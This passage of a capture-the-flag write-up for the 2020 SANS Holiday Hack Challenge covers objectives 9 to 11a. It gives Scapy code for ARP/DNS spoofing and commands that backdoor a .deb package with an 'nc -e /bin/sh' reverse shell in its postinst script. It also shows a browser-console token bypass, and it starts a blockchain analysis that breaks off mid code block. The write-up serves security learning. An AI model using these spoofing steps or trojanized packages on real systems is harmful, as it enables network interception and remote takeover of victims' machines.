<p>We see our spoofed <em>ARP</em> reply and the attacker sending a <em>DNS</em> query to our host to resolve the domain <code>ftp.osuosl.org</code>.</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">H3. Hmmm, looks like the host does a <em>DNS</em> request after you successfully do an <em>ARP</em> spoof. Let&rsquo;s return a <em>DNS</em> response resolving the request to our <em>IP</em>.</div>
<p>We are again helped for the <em>DNS</em> spoofing with the <code>dns_resp.py</code> script that we will need to complete:</p>
<script type="application/javascript" src="https://gist.github.com/noobintheshell/0339659769f005d0219b63cf522813db.js"></script>

<p>The goal is to send a <em>DNS</em> response to the attacker resolving the domain name to our <em>IP</em> address to see what the malware will do next. We can get some help on the <em>DNS</em> protocol from <a href="https://www.cloudshark.org/captures/0320b9b57d35">this capture</a>.</p>
<p>First, we need to change the <em>IP</em> address we are spoofing on line 11:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">ipaddr_we_arp_spoofed</span> <span class="o">=</span> <span class="s2">&#34;10.6.6.53&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>On lines 16 to 17, we need to set the right <em>Ethernet/IP</em> addresses. We have seen most of the values in the <em>ARP</em> spoofing part:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">eth</span> <span class="o">=</span> <span class="n">Ether</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">macaddr</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="s2">&#34;4c:24:57:ab:ed:84&#34;</span><span class="p">)</span>
<span class="n">ip</span>  <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s2">&#34;10.6.6.35&#34;</span><span class="p">,</span> <span class="n">src</span><span class="o">=</span><span class="n">ipaddr_we_arp_spoofed</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Regarding the <em>UDP</em> layer on line 18, we need to capture the attacker source port that will be the destination port in the response. As the attacker packet is an argument of the function we can retrieve it with <code>packet[UDP].sport</code>. The source port is the <em>DNS</em> default port:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">udp</span> <span class="o">=</span> <span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">UDP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span><span class="p">,</span> <span class="n">sport</span><span class="o">=</span><span class="mi">53</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>Finally, the <em>DNS</em> response will be on lines 19 to 21. We take most of the information from the <em>DNS</em> request:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">dns</span> <span class="o">=</span> <span class="n">DNS</span><span class="p">(</span>
  <span class="nb">id</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> \  <span class="c1"># the DNS query ID</span>
  <span class="n">qd</span> <span class="o">=</span> <span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="p">,</span> \  <span class="c1"># the query domain</span>
  <span class="n">aa</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> \               <span class="c1"># authoritative answer</span>
  <span class="n">qr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> \               <span class="c1"># 0 for a request and 1 for a response</span>
                          <span class="c1"># the domain name that resolves on our IP</span>
  <span class="n">an</span> <span class="o">=</span> <span class="n">DNSRR</span><span class="p">(</span><span class="n">rrname</span><span class="o">=</span><span class="n">packet</span><span class="p">[</span><span class="n">DNS</span><span class="p">]</span><span class="o">.</span><span class="n">qd</span><span class="o">.</span><span class="n">qname</span><span class="p">,</span> <span class="n">rdata</span><span class="o">=</span><span class="n">ipaddr</span><span class="p">)</span>
<span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We can launch, in order, <code>tcpdump -nni eth0</code>, <code>./dns_resp.py &amp;</code>, that will wait until a <em>DNS</em> query is seen, and <code>./arp_resp.py</code>. What we see is that after a successful <code>ARP</code> and <code>DNS</code> spoofing, an <code>HTTP</code> call (in green) is done on our host by the attacker:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_07.webp" alt="DNS spoofing" data-caption="DNS spoofing" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      DNS spoofing
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s start an <em>HTTP</em> listener to see the attacker&rsquo;s request. This can be quickly done with <em>Python</em>: <code>python3 -m http.server 80</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_08.webp" alt="HTTP listener" data-caption="HTTP listener" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      HTTP listener
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-warning" role="alert" data-dir="ltr">H4. The malware on the host does an <em>HTTP</em> request for a <code>.deb</code> package. Maybe we can get command line access by sending it a command in <a href="http://www.wannescolman.be/?p=98">a customized .deb file</a></div>
<p>We have some <code>.deb</code> files available in <code>/home/guest/debs</code>. We can follow the given article to add a <em>Netcat</em> reverse shell to the <code>.deb</code> file.</p>
<p>First, we prepare our working environment, copy the <em>Netcat</em> package that we will use for the reverse shell and rename it as the package that the attacker is fetching:</p>
<div class="box">$ mkdir /tmp/packing<br />
$ cd /tmp/packing<br />
$ cp /home/guest/debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb ./suriv_amd64.deb</div>
<p>We extract the package in the <code>work</code> directory:</p>
<div class="box">$ dpkg -x suriv_amd64.deb work</div>
<p>We retrieve the <code>control</code> file from the package:</p>
<div class="box">$ mkdir work/DEBIAN<br />
$ ar -x suriv_amd64.deb<br />
$ tar xf control.tar.xz ./control</div>
<p>We create the <code>postinst</code> script that will trigger the <em>Netcat</em> reverse shell to our host on port <code>1234</code>:</p>
<div class="box">$ echo -e &lsquo;#!/bin/bash\nnc -e /bin/sh 10.6.0.2 1234&rsquo; &gt; postinst</div>
<p>Then copy those files in the <code>work/DEBIAN</code> folder and build the new backdoored package that we rename with the right name:</p>
<div class="box">$ mv control work/DEBIAN/<br />
$ mv postinst work/DEBIAN/<br />
$ chmod +x work/DEBIAN/postinst<br />
$ dpkg-deb &ndash;build /tmp/packing/work/<br />
$ mv work.deb suriv_amd64.deb</div>
<p>Now that the package is ready to be delivered to the attacker, we create the necessary folder tree in <code>/tmp</code> and copy our package there. Then we spawn our <code>HTTP</code> listener from the <code>/tmp</code> folder:</p>
<div class="box">$ mkdir -p /tmp/pub/jfrost/backdoor<br />
$ mv suriv_amd64.deb /tmp/pub/jfrost/backdoor<br />
$ cd /tmp<br />
$ python3 -m http.server 80</div>
<p>From another terminal pane, we spawn a <em>Netcat</em> listener with <code>nc -lnvp 1234</code> and yet from the third terminal pane, we launch our two spoofing scripts as we did before. After a few second, we have a hit:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj09_09.webp" alt="reverse shell" data-caption="reverse shell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      reverse shell
      
        
        
      
    </figcaption>
  
</figure>
<p>We are on the attacker host with his <code>jfrost</code> account! We find the needed file <code>NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt</code> in the root folder. You can read it <a href="https://gist.github.com/noobintheshell/08de86bfad3c44955bf2d901fd5af54e">here</a>.</p>
<div class="notices success" data-title="Objective 9 answer">
  Tanta Kringle
</div>
<p>We unlock the 6th narrative:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative06.webp" alt="narrative 6 of 7" data-caption="narrative 6 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 6 of 7
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="10---defeat-fingerprint-sensor">10 - Defeat Fingerprint Sensor</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_01.webp" alt="Objective 10 description" data-caption="Objective 10 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 10 description
      
        
        
      
    </figcaption>
  
</figure>
<p>First of all, we need to activate the <em>Santa&rsquo;s Office</em> floor. This is now possible as we found the last bulb and items on the <em>Roof</em>. Here is one possible solution to hit the three sockets with the right color:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_02.webp" alt="Santavator completed" data-caption="Santavator completed" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator completed
      
        
        
      
    </figcaption>
  
</figure>
<p>We have now access to <em>Santa&rsquo;s Office</em>…well&hellip;almost, as it is protected with a fingerprint:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_03.webp" alt="Santavator fingerprint" data-caption="Santavator fingerprint" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santavator fingerprint
      
        
        
      
    </figcaption>
  
</figure>
<p>Our avatar cannot access it…but we can as <strong>Santa</strong>. However, the goal is to access <em>Santa&rsquo;s Office</em> without impersonating <strong>Santa</strong>. How to bypass that?</p>
<p>We can have a look at the <em>Javascript</em> code of the <em>Santavator</em> in <code>app.js</code>. By using the browser&rsquo;s <em>Developer Tools</em> (see <a href="https://www.lifewire.com/web-browser-developer-tools-3988965">this article</a>). We see that in order to access this floor we need 1) to power the button (what we just did) and 2) get the <code>besanta</code> token that we usually get when we impersonate <strong>Santa</strong>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_06.webp" alt="app.js snippet" data-caption="app.js snippet" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      app.js snippet
      
        
        
      
    </figcaption>
  
</figure>
<p>In the console, we can check the tokens we currently have and we are indeed missing the <code>besanta</code> one:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_07.webp" alt="console" data-caption="console" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      console
      
        
        
      
    </figcaption>
  
</figure>
<p>We simply add it to the list by using the <em>JS</em> console and the second check is passed :)</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_08.webp" alt="fingerprint bypass" data-caption="fingerprint bypass" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      fingerprint bypass
      
        
        
      
    </figcaption>
  
</figure>
<p>We can now reach <em>Santa&rsquo;s Office</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_05.webp" alt="Santa&#39;s office" data-caption="Santa&#39;s office" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Santa&#39;s office
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Tinsel</strong> is not happy though:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Tinsel Upatree:</strong><br />
GOSHGOLLY How did you get in here??</p>
<p>I mean, hey, I&rsquo;m impressed you made it in here, but you&rsquo;ve got to leave! Breaking into <em>Santa&rsquo;s Office</em> might mean immediate membership on the wrong side of the <em>Naughty/Nice</em> List.</p>
</div>
<h3 id="11a---naughtynice-list-with-blockchain-investigation-part1">11a - Naughty/Nice List with Blockchain Investigation Part 1</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_01.webp" alt="Objective 11a description" data-caption="Objective 11a description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 11a description
      
        
        
      
    </figcaption>
  
</figure>
<p>This challenge can only be done as <strong>Santa</strong>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj10_04.webp" alt="Objective 11a location" data-caption="Objective 11a location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 11a location
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Tinsel Upatree</strong> is waiting for us with a document on our desk:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Tinsel Upatree:</strong><br />
<strong>Santa</strong>, I don&rsquo;t know if you&rsquo;ve heard, but something is very, very wrong…</p>
<p>We tabulated the latest score of the <em>Naughty/Nice Blockchain</em>. <strong>Jack Frost</strong> is the nicest being in the world! <strong>Jack Frost</strong>!?! As you know, we only really start checking the <em>Naughty/Nice</em> totals as we get closer to the holidays. Out of nowhere, <strong>Jack Frost</strong> has this crazy score… positive 4,294,935,958 nice points! No one has EVER gotten a score that high! No one knows how it happened. Most of us recall Jack having a NEGATIVE score only a few days ago…</p>
<p>Worse still, his huge positive score seems to have happened way back in March. Our first thought was that he somehow changed the blockchain - but, as you know, that isn&rsquo;t possible.</p>
<p>We ran a validation of the blockchain and it all checks out. Even the smallest change to any block should make it invalid. Blockchains are huge, so we cut a one minute chunk from when <strong>Jack</strong>&rsquo;s big score registered back in March. You can get a slice of the <em>Naughty/Nice</em> blockchain on your desk.</p>
<p>You can get some <a href="https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip">tools to help you here</a>. <strong>Tangle Coalbox</strong>, in the <em>Speaker UNPreparedness Room</em>. has been talking with attendees about the issue.</p>
</div>
<p>The tools that we get will help in interacting with the <code>blockchain.dat</code> (the actual _Naughty/Nice _blockchain) we retrieve from <strong>Santa</strong>&rsquo;s desk. We can as well have a look at <a href="https://www.youtube.com/watch?v=reKsZ8E44vw">this KringleCon 3 talk</a>.</p>
<p>The <code>naughty_nice.py</code> <em>Python</em> script explains how the blockchain is constructed and how we can interact with it to read or verify blocks.</p>
<p>We can get some basic information on the blockchain as well as the details of the first block with the following code:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_02.webp" alt="getting blockchain basic knowledge" data-caption="getting blockchain basic knowledge" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      getting blockchain basic knowledge
      
        
        
      
    </figcaption>
  
</figure>
<p>The output is:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_03.webp" alt="blockchain stats and block example" data-caption="blockchain stats and block example" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      blockchain stats and block example
      
        
        
      
    </figcaption>
  
</figure>
<p>We see that we have a partial blockchain that starts at index <code>128449</code> and ends at index <code>129996</code>. A total of 1548 blocks. If we verify the blockchain as-is, it will fail as the genesis block (the first block) does not exist:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_04.webp" alt="blockchain failed verification" data-caption="blockchain failed verification" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      blockchain failed verification
      
        
        
      
    </figcaption>
  
</figure>
<p>We have to set the initial <code>previous_hash</code> to the one of the first block we have at our disposal and that we saw earlier:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj11a_05.webp" alt="blockchain passed verification" data-caption="blockchain passed verification" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      blockchain passed verification
      
        
        
      
    </figcaption>
  
</figure>
<p>We can as well dump the embedded documents with the <code>Block.dump_doc(doc_no)</code> method. For the first block it would be:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
